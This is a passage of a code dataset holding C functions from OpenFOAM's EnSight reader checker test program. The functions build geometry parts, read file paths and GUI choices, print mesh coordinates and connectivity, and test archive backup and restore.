i = ne - 1;\n            if(i > 0) {\n              fprintf(stderr,\"   %s Element %d of %d:\\n\",Elem_info[et].name,i+1,ne);\n              if(Element_labels) {\n                fprintf(stderr,\"      id: %d\\n\",elemids[i]);\n              }\n              fprintf(stderr,\"      connectivity:\");\n\n              for(j=nsid_len-conns[i][0]; j<nsid_len; ++j) {\n                fprintf(stderr,\" %d\",nsid_con[j]);\n              }\n              fprintf(stderr,\"\\n\");\n            }\n          }\n\n          /* Nfaced elements if any\n           *-----------------------*/\n          if(et == Z_NFACED ||\n             et == Z_G_NFACED) {\n\n            nface_len = 0;\n            for(i=0; i<ne; ++i) {\n              nface_len += conns[i][0];\n            }\n\n            nface_con = (int *) calloc(nface_len,sizeof(int));\n            if(nface_con == (int *) NULL) {\n              fprintf(stderr,\"Error: allocating nfaced face array\\n\");\n              return(Z_ERR);\n            }\n\n            err = USERD_get_nfaced_nodes_per_face(pn,nface_con);\n            if(err == Z_ERR) {\n              fprintf(stderr,\"Error: getting nfaced face array array\\n\");\n              return(Z_ERR);\n            }\n\n            npf_len = 0;\n            for(i=0; i<nface_len; ++i) {\n              npf_len += nface_con[i];\n            }\n\n            npf_con = (int *) calloc(npf_len,sizeof(int));\n            if(npf_con == (int *) NULL) {\n              fprintf(stderr,\"Error: allocating nfaced npf array\\n\");\n              return(Z_ERR);\n            }\n\n            err = USERD_get_nfaced_conn(pn,npf_con);\n            if(err == Z_ERR) {\n              fprintf(stderr,\"Error: getting nfaced conn array\\n\");\n              return(Z_ERR);\n            }\n\n            /* First element of the type\n             *--------------------------*/\n            jj = 0;\n            kk = 0;\n            for(i=0; i<ne; ++i) {\n\n              if(i == 0 ||\n                 i == ne-1) {\n                fprintf(stderr,\"   %s Element %d of %d:\\n\",Elem_info[et].name,\n                        i+1,ne);\n                if(Element_labels) {\n                  fprintf(stderr,\"      id: %d\\n\",elemids[i]);\n                }\n                for(j=0; j<conns[i][0]; ++j) {\n                  fprintf(stderr,\"      face %d connectivity:\",j+1);\n                  for(k=0; k<nface_con[jj]; ++k) {\n                    fprintf(stderr,\" %d\",npf_con[kk]);\n                    ++kk;\n                  }\n                  fprintf(stderr,\"\\n\");\n                  ++jj;\n                }\n              }\n              else {\n                for(j=0; j<conns[i][0]; ++j) {\n                  for(k=0; k<nface_con[jj]; ++k) {\n                    ++kk;\n                  }\n                  ++jj;\n                }\n              }\n            }\n          }\n#else\n\n          maxcheck = Z_MAXTYPE;\n\n#endif\n\n          /* Regular elements\n           *-----------------*/\n          if(et < maxcheck) {\n\n            /* First element of the type\n             *--------------------------*/\n            i = 0;\n            fprintf(stderr,\"   %s Element %d of %d:\\n\",Elem_info[et].name,i+1,ne);\n            if(Element_labels) {\n              fprintf(stderr,\"      id: %d\\n\",elemids[i]);\n            }\n            fprintf(stderr,\"      connectivity:\");\n            for(j=0; j<Elem_info[et].con_len; ++j) {\n              fprintf(stderr,\" %d\",conns[i][j]);\n            }\n            fprintf(stderr,\"\\n\");\n\n            /* check the connectivity for negative numbers\n             * -------------------------------------------*/\n#if defined GT_USERD_API_100\n            for (i=0;i<ne;i++){\n              for(j=0; j<Elem_info[et].con_len; ++j) {\n                /* ---------- uncomment to print out connectivity values ---------- */\n/*              fprintf(stderr,\" %d\",conns[i][j]);  */\n                if (conns[i][j] <= 0 || conns[i][j] > Pbuild[p].nn ) {\n                  fprintf(stderr,\"\\n****************************\\n\");\n                  fprintf(stderr,\"Connectivity value out of bounds: \\n\");\n                  fprintf(stderr,\"Either less than zero or greater than \\n\");\n                  fprintf(stderr,\"  number of nodes in part!!  \\n\");\n                  fprintf(stderr,\"i = %d   j = %d  conns[i][j] = %d \\n\",i,j,conns[i][j]);\n                  fprintf(stderr,\"****************************\\n\");\n                }\n              }\n                /* ---------- uncomment to print out connectivity values ---------- */\n/*            fprintf(stderr,\"\\n\"); */\n            }\n#endif\n            /* Last element of the type\n             *-------------------------*/\n            i = ne - 1;\n            if(i > 0) {\n              fprintf(stderr,\"   %s Element %d of %d:\\n\",Elem_info[et].name,i+1,ne);\n              if(Element_labels) {\n                fprintf(stderr,\"      id: %d\\n\",elemids[i]);\n              }\n              fprintf(stderr,\"      connectivity:\");\n              for(j=0; j<Elem_info[et].con_len; ++j) {\n                fprintf(stderr,\" %d\",conns[i][j]);\n              }\n              fprintf(stderr,\"\\n\");\n            }\n          }\n\n          /* Free the allocated memory\n           *--------------------------*/\n          if(NULL != conns) {\n            if(NULL != *conns) {\n              free(*conns);\n              *conns = NULL;\n            }\n            free(conns);\n            conns = NULL;\n          }\n\n          if(Element_labels) {\n            free(elemids);\n          }\n        }\n      }\n\n      /* Get the coords\n       *---------------*/\n      nn = Pbuild[p].nn;\n\n      if(nn > 0) {\n\n        coords = (float **) calloc(3,sizeof(float *));\n        if(coords == (float **) NULL) {\n          fprintf(stderr,\"Error: allocating coords array\\n\");\n          return(Z_ERR);\n        }\n        else {\n          for(i=0; i<3; ++i) {\n            coords[i] = (float *) calloc((nn+1),sizeof(float));\n            if(coords[i] == (float *) NULL) {\n              fprintf(stderr,\"Error: allocating coords array\\n\");\n              return(Z_ERR);\n            }\n          }\n        }\n\n        if(Node_labels) {\n          nodeids = (int *) calloc((nn+1),sizeof(int));\n          if(nodeids == (int *) NULL) {\n            fprintf(stderr,\"Error: allocating nodeids array\\n\");\n            return(Z_ERR);\n          }\n        }\n\n\n        err = USERD_get_part_coords(pn,coords);\n        if(err == Z_ERR) {\n          fprintf(stderr,\"Error: getting unstructured coords\\n\");\n          return(Z_ERR);\n        }\n\n        if(Node_labels) {\n          err = USERD_get_part_node_ids(pn,nodeids);\n          if(err == Z_ERR) {\n            fprintf(stderr,\"Error: getting nodeids\\n\");\n            return(Z_ERR);\n          }\n        }\n\n        /* Echo \"some\" info\n         *-----------------*/\n\n        /* First node\n         *-----------*/\n        i = 1;\n        fprintf(stderr,\"   Node %d of %d:\\n\",i,nn);\n        if(Node_labels) {\n          fprintf(stderr,\"      id: %d\\n\",nodeids[i]);\n        }\n        fprintf(stderr,\"      x y z coordinates: %g %g %g\\n\",\n                coords[0][i], coords[1][i], coords[2][i]);\n        mm[0] = mm[1] = coords[0][i];\n        mm[2] = mm[3] = coords[1][i];\n        mm[4] = mm[5] = coords[2][i];\n\n\n        /* Last node\n         *----------*/\n        i = nn;\n        if(i > 1) {\n          fprintf(stderr,\"   Node %d of %d:\\n\",i,nn);\n          if(Node_labels) {\n            fprintf(stderr,\"      id: %d\\n\",nodeids[i]);\n          }\n          fprintf(stderr,\"      x y z coordinates: %g %g %g\\n\",\n                  coords[0][i], coords[1][i], coords[2][i]);\n        }\n\n        /* Min and max coordinate values\n         *------------------------------*/\n        for(i=2; i<=nn; ++i) {\n          if(coords[0][i] < mm[0]) {\n            mm[0] = coords[0][i];\n          }\n          if(coords[0][i] > mm[1]) {\n            mm[1] = coords[0][i];\n          }\n          if(coords[1][i] < mm[2]) {\n            mm[2] = coords[1][i];\n          }\n          if(coords[1][i] > mm[3]) {\n            mm[3] = coords[1][i];\n          }\n          if(coords[2][i] < mm[4]) {\n            mm[4] = coords[2][i];\n          }\n          if(coords[2][i] > mm[5]) {\n            mm[5] = coords[2][i];\n          }\n        }\n\n        fprintf(stderr,\"   Coordinate ranges:\\n\");\n        fprintf(stderr,\"      min x: %g\\n\",mm[0]);\n        fprintf(stderr,\"      max x: %g\\n\",mm[1]);\n        fprintf(stderr,\"      min y: %g\\n\",mm[2]);\n        fprintf(stderr,\"      max y: %g\\n\",mm[3]);\n        fprintf(stderr,\"      min z: %g\\n\",mm[4]);\n        fprintf(stderr,\"      max z: %g\\n\",mm[5]);\n\n\n        /* Free the allocated memory\n         *--------------------------*/\n        for(i=0; i<3; ++i) {\n          free(coords[i]);\n        }\n        free(coords);\n        if(Node_labels) {\n          free(nodeids);\n        }\n      }\n    }\n\n\n    /*---------------------\n     * For structured parts\n     *---------------------*/\n    else {\n\n      empty_part = FALSE;\n      if(Pbuild[p].ne[0] == 0 &&\n         Pbuild[p].ne[1] == 0 &&\n         Pbuild[p].ne[2] == 0) {\n        empty_part = TRUE;\n      }\n\n      if(!empty_part) {\n\n        /* Get the block coords\n         *---------------------*/\n        for(comp=0; comp<3; ++comp) {\n          if(Pbuild[p].ne[comp] < 1) {\n            bdim[comp] = 1;\n          }\n          else {\n            bdim[comp] = Pbuild[p].ne[comp];\n          }\n        }\n        nn = bdim[0] * bdim[1] * bdim[2];\n\n        bd1 = bdim[0]-1;\n        if(bd1 < 1) {\n          bd1 = 1;\n        }\n        bd2 = bdim[1]-1;\n        if(bd2 < 1) {\n          bd2 = 1;\n        }\n        bd3 = bdim[2]-1;\n        if(bd3 < 1) {\n          bd3 = 1;\n        }\n        ne = bd1 * bd2 * bd3;\n\n        /* Determine cell type\n         *--------------------*/\n        num_dims = 3;\n        for(i=0; i<3; ++i) {\n          if(bdim[i] == 1) {\n            --num_dims;\n          }\n        }\n        if(num_dims == 3) {\n          cell_type = Z_HEX08;\n        }\n        else if(num_dims == 2) {\n          cell_type = Z_QUA04;\n        }\n        else {\n          cell_type = Z_BAR02;\n        }\n\n        coords = (float **) calloc(num_dims,sizeof(float *));\n        if(coords == (float **) NULL) {\n          fprintf(stderr,\"Error: allocating coords array\\n\");\n          return(Z_ERR);\n        }\n        else {\n          for(i=0; i<num_dims; ++i) {\n            coords[i] = (float *) calloc(nn,sizeof(float));\n            if(coords[i] == (float *) NULL) {\n              fprintf(stderr,\"Error: allocating coords array\\n\");\n              return(Z_ERR);\n            }\n          }\n        }\n\n        /* Get the coords\n         *---------------*/\n        for(comp=0; comp<num_dims; ++comp) {\n          err = USERD_get_block_coords_by_component(pn,comp,coords[comp]);\n          if(err == Z_ERR) {\n            fprintf(stderr,\"Error: getting block coords\\n\");\n            return(Z_ERR);\n          }\n        }\n\n\n#if (defined GT_USERD_API_200)\n\n        if(Node_labels) {\n          nodeids = (int *) calloc(nn,sizeof(int));\n          if(nodeids == (int *) NULL) {\n            fprintf(stderr,\"Error: allocating nodeids array\\n\");\n            return(Z_ERR);\n          }\n        }\n        /* Get the node ids - if any\n         *--------------------------*/\n        if(Node_labels) {\n          err = USERD_get_part_node_ids(pn,nodeids);\n          if(err == Z_ERR) {\n            fprintf(stderr,\"Error: getting nodeids\\n\");\n            return(Z_ERR);\n          }\n        }\n#endif\n\n        /* Echo \"some\" info\n         *-----------------*/\n\n        /* First node\n         *-----------*/\n        if(nn > 0) {\n          i = 0;\n          fprintf(stderr,\"   Node %d of %d:\\n\",i+1,nn);\n\n#if (defined GT_USERD_API_200)\n\n          if(Node_labels) {\n            fprintf(stderr,\"      id: %d\\n\",nodeids[i]);\n          }\n#endif\n          if(num_dims == 3) {\n            fprintf(stderr,\"      x y z coordinates: %g %g %g\\n\",\n                    coords[0][i], coords[1][i], coords[2][i]);\n            mm[0] = mm[1] = coords[0][i];\n            mm[2] = mm[3] = coords[1][i];\n            mm[4] = mm[5] = coords[2][i];\n          }\n          else if(num_dims == 2) {\n            fprintf(stderr,\"      x y coordinates: %g %g\\n\",\n                    coords[0][i], coords[1][i]);\n            mm[0] = mm[1] = coords[0][i];\n            mm[2] = mm[3] = coords[1][i];\n          }\n          else {\n            fprintf(stderr,\"      x coordinates: %g\\n\",\n                    coords[0][i]);\n            mm[0] = mm[1] = coords[0][i];\n          }\n\n\n          /* Last node\n           *----------*/\n          i = nn-1;\n          if(i > 1) {\n            fprintf(stderr,\"   Node %d of %d:\\n\",i+1,nn);\n\n#if (defined GT_USERD_API_200)\n            if(Node_labels) {\n              fprintf(stderr,\"      id: %d\\n\",nodeids[i]);\n            }\n#endif\n            if(num_dims == 3) {\n              fprintf(stderr,\"      x y z coordinates: %g %g %g\\n\",\n                      coords[0][i], coords[1][i], coords[2][i]);\n            }\n            else if(num_dims == 2) {\n              fprintf(stderr,\"      x y coordinates: %g %g\\n\",\n                      coords[0][i], coords[1][i]);\n            }\n            else {\n              fprintf(stderr,\"      x coordinates: %g\\n\",\n                      coords[0][i]);\n            }\n          }\n        }\n\n        /* Min and max coordinate values\n         *------------------------------*/\n        for(i=1; i<nn; ++i) {\n          if(coords[0][i] < mm[0]) {\n            mm[0] = coords[0][i];\n          }\n          if(coords[0][i] > mm[1]) {\n            mm[1] = coords[0][i];\n          }\n          if(num_dims > 1) {\n            if(coords[1][i] < mm[2]) {\n              mm[2] = coords[1][i];\n            }\n            if(coords[1][i] > mm[3]) {\n              mm[3] = coords[1][i];\n            }\n          }\n          if(num_dims > 2) {\n            if(coords[2][i] < mm[4]) {\n              mm[4] = coords[2][i];\n            }\n            if(coords[2][i] > mm[5]) {\n              mm[5] = coords[2][i];\n            }\n          }\n        }\n\n        fprintf(stderr,\"   Coordinate ranges:\\n\");\n        fprintf(stderr,\"      min x: %g\\n\",mm[0]);\n        fprintf(stderr,\"      max x: %g\\n\",mm[1]);\n        if(num_dims > 1) {\n          fprintf(stderr,\"      min y: %g\\n\",mm[2]);\n          fprintf(stderr,\"      max y: %g\\n\",mm[3]);\n        }\n        if(num_dims > 2) {\n          fprintf(stderr,\"      min z: %g\\n\",mm[4]);\n          fprintf(stderr,\"      max z: %g\\n\",mm[5]);\n        }\n\n        /* Free the allocated memory - so far\n         *-----------------------------------*/\n        for(i=0; i<num_dims; ++i) {\n          free(coords[i]);\n        }\n        free(coords);\n\n#if (defined GT_USERD_API_200)\n        if(Node_labels) {\n          free(nodeids);\n        }\n#endif\n\n        /* Get the block iblanking - if any\n         *---------------------------------*/\n        if(Pbuild[p].type == Z_IBLANKED) {\n\n          iblanking = (int *) calloc(nn,sizeof(int));\n          if(iblanking == (int *) NULL) {\n            fprintf(stderr,\"Error: allocating iblanking array\\n\");\n            return(Z_ERR);\n          }\n\n          err = USERD_get_block_iblanking(pn,iblanking);\n          if(err == Z_ERR) {\n            fprintf(stderr,\"Error: getting block iblanking\\n\");\n            return(Z_ERR);\n          }\n\n          /* Echo \"some\" info\n           *-----------------*/\n          ib[Z_EXT]    = 0;\n          ib[Z_INT]    = 0;\n          ib[Z_BND]    = 0;\n          ib[Z_INTBND] = 0;\n          ib[Z_SYM]    = 0;\n\n          for(i=0; i<nn; ++i) {\n            ++ib[iblanking[i]];\n          }\n\n          fprintf(stderr,\"   Iblanking breakdown:\\n\");\n          fprintf(stderr,\"      Number of Z_EXT:    %d\\n\",ib[Z_EXT]);\n          fprintf(stderr,\"      Number of Z_INT:    %d\\n\",ib[Z_INT]);\n          fprintf(stderr,\"      Number of Z_BND:    %d\\n\",ib[Z_BND]);\n          fprintf(stderr,\"      Number of Z_INTBND: %d\\n\",ib[Z_INTBND]);\n          fprintf(stderr,\"      Number of Z_SYM:    %d\\n\",ib[Z_SYM]);\n\n          free(iblanking);\n        }\n\n#if (defined GT_USERD_API_200)\n\n        /* Get the ghost flags - if any\n         *-----------------------------*/\n        if(Pbuild[p].ghosts) {\n\n          ghost_flag = (int *) calloc(ne,sizeof(int));\n          if(ghost_flag == (int *) NULL) {\n            fprintf(stderr,\"Error: allocating ghost_flag array\\n\");\n            return(Z_ERR);\n          }\n\n          err = USERD_get_block_ghost_flags(pn,ghost_flag);\n          if(err == Z_ERR) {\n            fprintf(stderr,\"Error: getting block ghost flags\\n\");\n            return(Z_ERR);\n          }\n\n          /* Echo \"some\" info\n           *-----------------*/\n          num_ghosts = 0;\n\n          for(i=0; i<ne; ++i) {\n            if(ghost_flag[i] > 0) {\n              ++num_ghosts;\n            }\n          }\n\n          fprintf(stderr,\"   Block Ghost flag breakdown:\\n\");\n          fprintf(stderr,\"      %d ghost cells out of %d total cells\\n\",\n                  num_ghosts,ne);\n\n          free(ghost_flag);\n        }\n\n        /* Get the element ids - if any\n         *-----------------------------*/\n        if(Element_labels) {\n\n          elemids = (int *) calloc(ne,sizeof(int));\n          if(elemids == (int *) NULL) {\n            fprintf(stderr,\"Error: allocating elemids array\\n\");\n            return(Z_ERR);\n          }\n\n\n          et = cell_type;\n          err = USERD_get_part_element_ids_by_type(pn,et,elemids);\n          if(err == Z_ERR) {\n            fprintf(stderr,\"Error: getting element ids\\n\");\n            return(Z_ERR);\n          }\n\n          /* First element of the type\n           *--------------------------*/\n          i = 0;\n          fprintf(stderr,\"   %s Element %d of %d:\\n\",Elem_info[et].name,i+1,ne);\n          fprintf(stderr,\"      id: %d\\n\",elemids[i]);\n\n          /* Last element of the type\n           *-------------------------*/\n          i = ne - 1;\n          if(i > 0) {\n            fprintf(stderr,\"   %s Element %d of %d:\\n\",Elem_info[et].name,i+1,ne);\n            fprintf(stderr,\"      id: %d\\n\",elemids[i]);\n          }\n\n          free(elemids);\n        }\n#endif\n      }\n      else {\n        fprintf(stderr,\"   Empty structured part\\n\");\n      }\n    }\n\n    /* Get border availability\n     *------------------------*/\n    err = USERD_get_border_availability(pn,num_elems);\n    if(err == Z_OK) {\n\n      /* Get border elements - if any\n       *-----------------------------*/\n      for(et=0; et<Z_MAXTYPE; ++et) {\n        ne = num_elems[et];\n        if(ne > 0) {\n\n          conns = (int **) calloc(ne,sizeof(int *));\n          if(conns == (int **) NULL) {\n            fprintf(stderr,\"Error: allocating border conns array\\n\");\n            return(Z_ERR);\n          }\n          else {\n            for(i=0; i<ne; ++i) {\n              conns[i] = (int *) calloc(Elem_info[et].con_len,sizeof(int));\n              if(conns[i] == (int *) NULL) {\n                fprintf(stderr,\"Error: allocating border conns array\\n\");\n                return(Z_ERR);\n              }\n            }\n          }\n\n          parent_type = (short *) calloc(ne,sizeof(short));\n          if(parent_type == (short *) NULL) {\n            fprintf(stderr,\"Error: allocating border parent_type array\\n\");\n            return(Z_ERR);\n          }\n\n          parent_num = (int *) calloc(ne,sizeof(int));\n          if(parent_num == (int *) NULL) {\n            fprintf(stderr,\"Error: allocating border parent_num array\\n\");\n            return(Z_ERR);\n          }\n\n\n          err = USERD_get_border_elements_by_type(pn,\n                                                  et,\n                                                  conns,\n                                                  parent_type,\n                                                  parent_num);\n          if(err == Z_ERR) {\n            fprintf(stderr,\"Error: getting border elements\\n\");\n            return(Z_ERR);\n          }\n\n\n          /* Echo \"some\" info\n           *-----------------*/\n\n          /* First element of the type\n           *--------------------------*/\n          i = 0;\n          fprintf(stderr,\"   %s border element %d of %d:\\n\",\n                  Elem_info[et].name,i+1,ne);\n          fprintf(stderr,\"      Parent type: %s\\n\",\n                  Elem_info[parent_type[i]].name);\n          fprintf(stderr,\"      Parent num:  %d\\n\",parent_num[i]);\n          fprintf(stderr,\"      connectivity:\");\n          for(j=0; j<Elem_info[et].con_len; ++j) {\n            fprintf(stderr,\" %d\",conns[i][j]);\n          }\n          fprintf(stderr,\"\\n\");\n\n          /* Last element of the type\n           *-------------------------*/\n          i = ne - 1;\n          if(i > 0) {\n            fprintf(stderr,\"   %s border element %d of %d:\\n\",\n                    Elem_info[et].name,i+1,ne);\n            fprintf(stderr,\"      Parent type: %s\\n\",\n                    Elem_info[parent_type[i]].name);\n            fprintf(stderr,\"      Parent num:  %d\\n\",parent_num[i]);\n            fprintf(stderr,\"      connectivity:\");\n            for(j=0; j<Elem_info[et].con_len; ++j) {\n              fprintf(stderr,\" %d\",conns[i][j]);\n            }\n            fprintf(stderr,\"\\n\");\n          }\n\n\n          /* Free the allocated memory\n           *--------------------------*/\n          for(i=0; i<ne; ++i) {\n            free(conns[i]);\n          }\n          free(conns);\n          free(parent_type);\n          free(parent_num);\n        }\n      }\n    }\n  } /* end for p = 0 to Num_parts */\n\n  return(Z_OK);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/*----------\n * get_input\n *----------*/\n", "func_signal": "static int\nget_input(int set_server_number,\n          int use_playfile,\n          char playfile[Z_MAXFILENP],\n          int two_fields,\n          int any_extra_gui,\n          int *swapbytes)", "code": "{\n  FILE *fplay;\n\n  int i, j;\n  int err;\n  int tot_servers;\n  int cur_server;\n  char the_path[Z_MAXFILENP];\n  char file1[Z_MAXFILENP];\n  char file2[Z_MAXFILENP];\n  char filename_1[Z_MAXFILENP];\n  char filename_2[Z_MAXFILENP];\n\n\n  fprintf(stderr,\"\\n-------------- get_input ----------------\\n\");\n\n  /*-----------------------------------------------------\n   * Prompt for the two input values, as the client would\n   * And set this info for the reader\n   *-----------------------------------------------------*/\n\n#if (defined GT_USERD_API_100)\n\n  /* Set the server number - if command line option to do so\n   *--------------------------------------------------------*/\n  if(set_server_number) {\n    fprintf(stderr,\"     Enter total number of servers: \");\n    scanf(\"%d\",&tot_servers);\n\n    fprintf(stderr,\"     Enter current server number: \");\n    scanf(\"%d\",&cur_server);\n\n    fprintf(stderr,\" Setting %d of %d for server number\\n\",cur_server,tot_servers);\n    USERD_set_server_number(cur_server,tot_servers);\n  }\n#endif\n\n  /* Set the filenames\n   *------------------*/\n  memset(the_path,EOS,Z_MAXFILENP);\n  memset(file1,EOS,Z_MAXFILENP);\n  memset(file2,EOS,Z_MAXFILENP);\n  memset(filename_1,EOS,Z_MAXFILENP);\n  memset(filename_2,EOS,Z_MAXFILENP);\n\n\n  if(!use_playfile) {\n    fprintf(stderr,\"     Enter the path: \");\n    scanf(\"%s\",the_path);\n\n\n    fprintf(stderr,\"     Enter filename_1: \");\n    scanf(\"%s\",file1);\n\n    if(two_fields == TRUE) {\n      fprintf(stderr,\"     Enter filename_2: \");\n      scanf(\"%s\",file2);\n    }\n\n    fprintf(stderr,\"     Enter Swapbytes (0 if FALSE, 1 if TRUE): \");\n    scanf(\"%d\",swapbytes);\n\n    if (TRUE == any_extra_gui ) {\n      fprintf(stderr,\"\\n**********************************************\\n\");\n      fprintf(stderr,\"****          Extra GUI INPUT                ***\\n\");\n      fprintf(stderr,\"**********************************************\\n\\n\");\n\n      fprintf(stderr, \"\\n      TOGGLE INPUT \\n\");\n      for (i=0; i<Num_toggles; i++) {\n        fprintf(stderr, \"      Enter Toggle Value for '%s' (1=toggle on, 0=toggle off)\\n\",Toggle_title[i]);\n        scanf(\"%d\",&Toggle_choice[i]);\n      }\n      fprintf(stderr, \"\\n      PULLDOWN INPUT \\n\");\n      for (i=0; i<Num_pulldowns; i++) {\n        fprintf(stderr, \"\\n      PULLDOWN # %d \\n\",i);\n        for (j = 0; j<Pulldown_number_in_list[i]; j++) {\n          fprintf(stderr, \"              %d %s\\n\",j,Pulldown_item_strings[i][j]);\n        }\n        fprintf(stderr, \"              Enter Pulldown Value for '%s' (0 to %d)\\n\",Pulldown_title[i],Pulldown_number_in_list[i]-1);\n        scanf(\"%d\",&Pulldown_choice[i]);\n      }\n      fprintf(stderr, \"\\n      FIELD INPUT \\n\");\n      for (i=0; i<Num_fields; i++) {\n        fprintf(stderr, \"Enter string for field %d '%s'\\n\",i,Field_title[i]);\n        scanf(\"%s\",Field_user_string[i]);\n      }\n\n    }                /* end if there is any extra gui stuff */\n  }                  /* end if not using playfile */\n  else {\n    fplay = fopen(playfile,\"rb\");\n    if(fplay == (FILE *)NULL) {\n      fprintf(stderr,\"Error: Opening the playfile %s\\n\",playfile);\n      return(Z_ERR);\n    }\n    else {\n      fscanf(fplay,\"%s\",the_path);\n      fscanf(fplay,\"%s\",file1);\n      if(two_fields == TRUE) {\n        fscanf(fplay,\"%s\",file2);\n      }\n      fscanf(fplay,\"%d\",swapbytes);\n\n      /* ---------------------\n       * Extra GUI stuff\n       * --------------------- */\n      if (TRUE == any_extra_gui) {\n\n        for (i=0; i<Num_toggles; i++) {\n          fscanf(fplay,\"%d\",&Toggle_choice[i]);\n        }\n\n        for (i=0; i<Num_pulldowns; i++) {\n          fscanf(fplay,\"%d\",&Pulldown_choice[i]);\n        }\n\n        for (i=0; i<Num_fields; i++) {\n          fscanf(fplay,\"%s\",Field_user_string[i]);\n        }\n      }\n      fclose(fplay);\n    }\n  }\n\n#ifdef _EGS\n  /* -------------------------------------------\n   * set the user choices here and run the code\n   * ------------------------------------------- */\n\n  /* set your choices here\n     Toggle_choice[0..Num_toggles]\n     Pulldown_choice[0..Num_pulldowns]\n     Field_user_string[Num_fields][0..Numfields]\n     amd then send your choices into this routine */\n\n  USERD_set_extra_gui_data(\n                  Toggle_choice,            /* [num_toggle] */\n                  Pulldown_choice,          /* [num_pulldown] */\n                  Field_user_string  );    /* [num_fields][Z_LEN_GUI_FIELD_STR] */\n\n  for (i=0; i<Num_toggles; i++) {\n    fprintf(stderr,\"Toggle Title %d : %s\\n\",i,Toggle_title[i]);\n    fprintf(stderr,\"User selection = %d \\n\",Toggle_choice[i]);\n  }\n  fprintf(stderr,\"\\n\\n\");\n\n  for (i=0; i<Num_pulldowns; i++) {\n    fprintf(stderr,\"Pulldown Title %d : %s\\n\", i , Pulldown_title[i] );\n    fprintf(stderr,\"Pulldown selection is # %d : %s\\n\",Pulldown_choice[i],Pulldown_item_strings[i][Pulldown_choice[i]]);\n  }\n\n  for (i=0; i<Num_fields; i++) {\n    fprintf(stderr,\"Field Title %d : %s\\n\",i,Field_title[i]);\n    fprintf(stderr,\"Field string %d: %s\\n\",i,Field_user_string[i]);\n\n  }\n\n\n#endif\n\n  if(strncmp(file1,\"/\",1)) {\n    strcpy(filename_1,the_path);\n    strcat(filename_1,\"/\");\n    strcat(filename_1,file1);\n  }\n  if(two_fields == TRUE) {\n    if(strncmp(file2,\"/\",1)) {\n      strcpy(filename_2,the_path);\n      strcat(filename_2,\"/\");\n      strcat(filename_2,file2);\n    }\n  }\n  if(*swapbytes == 0) {\n    *swapbytes = FALSE;\n  }\n  else {\n    *swapbytes = TRUE;\n  }\n\n  /* Feedback\n   *---------*/\n  fprintf(stderr,\" path: %s\\n\",the_path);\n  fprintf(stderr,\" filename_1: %s\\n\",filename_1);\n  fprintf(stderr,\" filename_2: %s\\n\",filename_2);\n  if(*swapbytes) {\n    fprintf(stderr,\" Swapbytes:    TRUE\\n\");\n  }\n  else {\n    fprintf(stderr,\" Swapbytes:    FALSE\\n\");\n  }\n\n  err = USERD_set_filenames(filename_1,filename_2,the_path,*swapbytes);\n  if(err == Z_ERR) {\n    fprintf(stderr,\"Error: Trouble setting the filenames\\n\");\n    return(Z_ERR);\n  }\n\n  return(Z_OK);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/*--------------\n * exercise_bkup\n *--------------*/\n", "func_signal": "static int\nexercise_bkup( void )", "code": "{\n  int err;\n  FILE *arcfile;\n\n  fprintf(stderr,\"\\n------------ exercise_archive -----------\\n\");\n\n  arcfile = fopen(\"test.arc\",\"wb\");\n  if(arcfile == (FILE *)NULL) {\n    fprintf(stderr,\"Error: opening test archive file\\n\");\n    return(Z_ERR);\n  }\n  err = USERD_bkup(arcfile,Z_SAVE_ARCHIVE);\n  if(err == Z_ERR) {\n    fprintf(stderr,\"Error: saving to test archive file\\n\");\n    return(Z_ERR);\n  }\n  fclose(arcfile);\n\n  arcfile = fopen(\"test.arc\",\"rb\");\n  err = USERD_bkup(arcfile,Z_REST_ARCHIVE);\n  if(err == Z_ERR) {\n    fprintf(stderr,\"Error: restoring from test archive file\\n\");\n    return(Z_ERR);\n  }\n\n  fprintf(stderr,\" Archive test completed\\n\");\n\n  fclose(arcfile);\n\n  return(Z_OK);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/*------------------\n * gold_part_builder\n *------------------*/\n", "func_signal": "static int\ngold_part_builder(int geom_time_step)", "code": "{\n  int i, j, k, jj, kk;\n  int err;\n  int geom_timeset;\n  int p, pn;\n  int et, ne;\n  int *elemids;\n  int **conns;\n  int nn;\n  int comp;\n  int bdim[3];\n  int ib[5];\n  int num_ghosts;\n  int num_dims;\n  int cell_type;\n  float mm[6];\n  float **coords;\n  int *nodeids;\n  int *iblanking;\n  int *ghost_flag;\n  short *parent_type;\n  int *parent_num;\n  int num_elems[Z_MAXTYPE];\n  CRD *crds;\n  int bd1,bd2,bd3;\n  int empty_part;\n  int *pdata;\n  int nsid_len;\n  int *nsid_con;\n  int nface_len;\n  int *nface_con;\n  int npf_len;\n  int *npf_con;\n  int maxcheck;\n  int num_failed = 0;\n  int *fail_flags = (int *) NULL;\n\n  fprintf(stderr,\"\\n------------- part_builder --------------\\n\");\n\n  if(Num_time_sets > 0) {\n    /* Get the timeset used for the geometry\n     *--------------------------------------*/\n    geom_timeset = USERD_get_geom_timeset_number();\n\n    /* Get the number of time steps for this timeset\n     *----------------------------------------------*/\n    Num_time_steps = USERD_get_num_of_time_steps(geom_timeset);\n    if(Num_time_steps < 1) {\n      fprintf(stderr,\" Error: Number of time steps returned: %d\\n\",Num_time_steps);\n      fprintf(stderr,\" (Must be >0 to be okay)\\n\");\n      return(Z_ERR);\n    }\n    if(geom_time_step > (Num_time_steps - 1)) {\n      geom_time_step = Num_time_steps - 1;\n    }\n\n    /* Set the timeset and step - to first step by default, but\n     * can set it at others using -gts command argument\n     *---------------------------------------------------------*/\n    USERD_set_time_set_and_step(geom_timeset,geom_time_step);\n\n    fprintf(stderr,\" Using timeset:   %d  (step range is %d through %d)\\n\",\n            geom_timeset,0,Num_time_steps-1);\n    fprintf(stderr,\" Using time step: %d\\n\",geom_time_step);\n  }\n\n  for(p=0; p<Num_parts; ++p) {\n    pn = p+1;\n\n    fprintf(stderr,\"\\n\\n----------------------------------------\");\n    fprintf(stderr,\" Part %d:\\n\",pn);\n\n    /*-----------------------\n     * For unstructured parts\n     *-----------------------*/\n    if(Pbuild[p].type == Z_UNSTRUCTURED) {\n\n      for(et=0; et<Z_MAXTYPE; ++et) {\n        ne = 